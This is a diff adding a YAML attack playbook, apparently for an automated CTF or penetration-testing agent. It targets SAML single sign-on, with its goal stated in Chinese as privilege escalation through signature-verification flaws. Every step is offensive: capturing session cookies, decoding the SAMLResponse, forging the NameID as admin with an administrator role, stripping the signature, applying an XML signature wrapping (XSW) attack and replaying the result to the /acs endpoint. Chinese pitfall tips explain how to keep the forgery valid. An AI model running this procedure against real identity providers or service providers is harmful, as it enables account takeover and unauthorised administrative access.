@@ -1,0 +1,36 @@
+name: saml_sso
+triggers:
+  - "saml"
+  - "sso"
+  - "assertion"
+  - "xsw"
+  - "nameid"
+  - "idp"
+  - "signature"
+  - "samlresponse"
+goal: 利用 SAML SSO 签名验证缺陷实现越权访问
+steps:
+  - tool: curl
+    args: "-sS -c /tmp/saml_cookies.txt {target}/"
+  - tool: crawler
+    args: "{target} --depth 2"
+  - tool: saml
+    args: "_decode $(cat /tmp/saml_response.txt)"
+  - tool: saml
+    args: "_decode $(cat /tmp/saml_response.txt) | grep -i nameid"
+  - tool: saml
+    args: "_encode --nameid admin --role administrator $(cat /tmp/saml_response.txt)"
+  - tool: saml
+    args: "_strip_sign $(cat /tmp/saml_modified.txt)"
+  - tool: saml
+    args: "_wrap xsw $(cat /tmp/saml_stripped.txt)"
+  - tool: curl
+    args: "-sS -b /tmp/saml_cookies.txt -d SAMLResponse=$(cat /tmp/saml_wrapped.txt) {target}/acs"
+  - tool: flag_extract
+    args: "$(cat /tmp/saml_replay_response.txt)"
+pitfalls:
+  - "SAMLResponse 是 base64+URL 编码，先解码再看内容"
+  - "签名剥离后需保持 XML 结构完整"
+  - "XSW 攻击需保持原始 Assertion 不变，插入修改后的副本"
+  - "重放时需携带原始会话 cookie"
+  - "注意 NameID 格式可能是 email 或 transient，不要改格式"
